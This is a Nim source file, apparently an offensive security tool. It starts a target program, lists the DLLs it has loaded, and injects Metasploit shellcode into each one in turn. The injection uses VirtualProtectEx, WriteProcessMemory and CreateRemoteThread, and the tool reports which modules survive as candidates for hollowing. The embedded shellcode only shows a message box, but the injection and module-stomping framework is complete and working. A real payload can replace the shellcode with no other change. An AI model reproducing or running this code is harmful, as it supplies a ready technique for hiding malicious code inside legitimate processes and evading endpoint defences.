import winim
import std/strformat
import std/tables
import osproc
import system
import os
## convert **LPWSTR** to Nim string
proc lpwstrc(bytes: array[MAX_PATH, WCHAR]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

var processName: string
if paramCount() != 1:
  echo "usage: module_scanner.exe <.exe path>"
  quit(1)
else:
  processName = paramStr(1)

# MSF shellcode
var shellcode: array[295, byte] = [
byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]


let tProcess = startProcess(processName)
var processId : DWORD = cast[DWORD](tProcess.processID) ## get module names from an already-running process

var prochandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)
var modulebuf: array[255, HMODULE]
var cb : DWORD = 255*sizeof(HMODULE)
var req: DWORD

echo "[*] waiting for module loading"
sleep(2000)
EnumProcessModules(prochandle, &modulebuf[0], cb, &req)
echo fmt"[*] targeting pid {processId}"

var mod_count: int = req div sizeof(HMODULE)
echo fmt"[*] target module count {mod_count}"

var mod_name: array[MAX_PATH, WCHAR]
var module_works = initTable[string, int]()

for i in 1..mod_count:
  if GetModuleFileNameEx(prochandle, modulebuf[i], &mod_name[0], cast[DWORD](sizeof(mod_name))):
    module_works[lpwstrc(mod_name)] = 0
    echo fmt"[*] found module {lpwstrc(mod_name)}"
  zeromem(&mod_name[0], sizeof(mod_name))

tProcess.kill()
tProcess.close()
for test_module_name, unused in module_works:
  let tProcess = startProcess(processName)


  let pHandle = OpenProcess(
      PROCESS_ALL_ACCESS, 
      false, 
      cast[DWORD](tProcess.processID)
  )

  sleep(2000)

  echo fmt"[?] testing {test_module_name}"
  var modulebuf: array[255, HMODULE]
  var cb : DWORD = 255*sizeof(HMODULE)
  var req: DWORD
  var mod_name: array[MAX_PATH, WCHAR]
  var testmodinfo: MODULEINFO

  var base_addr : LPVOID

  EnumProcessModules(pHandle, &modulebuf[0], cb, &req)
  var mod_count: int = req div sizeof(HMODULE)
    
  for i in 1..mod_count:
    if GetModuleFileNameEx(pHandle, modulebuf[i], &mod_name[0], cast[DWORD](sizeof(mod_name))):
      if lpwstrc(mod_name) == test_module_name:
        if GetModuleInformation(pHandle, modulebuf[i], &testmodinfo, cast[DWORD](sizeof(MODULEINFO))):
          base_addr = cast[LPVOID](cast[int64](testmodinfo.lpBaseOfDll) + 4096)
          echo fmt"  module entrypoint {toHex(cast[int64](base_addr))}"
          echo fmt"  module image_size {toHex(cast[int32](testmodinfo.SizeOfImage))}"
      zeromem(&mod_name[0], sizeof(mod_name))
  
  var oldprotect: DWORD
  let pSuccess = VirtualProtectEx(
    pHandle,
    base_addr,
    cast[SIZE_T](shellcode.len),
    PAGE_EXECUTE_READWRITE,
    &oldprotect
  )

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(
    pHandle, 
    base_addr,
    unsafeAddr shellcode,
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )

  echo "  CALL WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  let tHandle = CreateRemoteThread(
      pHandle, 
      NULL,
      0,
      cast[LPTHREAD_START_ROUTINE](base_addr),
      NULL, 
      0, 
      NULL
  )
  
  echo "[?] Injected, waiting ...."
  sleep(2000)
  echo "[?] is process alive?"

  var pids : array[1024, DWORD]
  var cbNeeded, cProcesses: DWORD
  EnumProcesses(&pids[0], cast[DWORD](sizeof(pids)), &cbNeeded)

  if pids.contains(cast[DWORD](tProcess.processID)):
    echo "[!] valid candidate found"
    module_works[test_module_name] = 1

  CloseHandle(tHandle)
  CloseHandle(pHandle)
  tProcess.kill()
  tProcess.close()

echo "[!] native DLLs to hollow:"
for key, val in module_works:
  if val == 1:
    echo fmt"  {key}"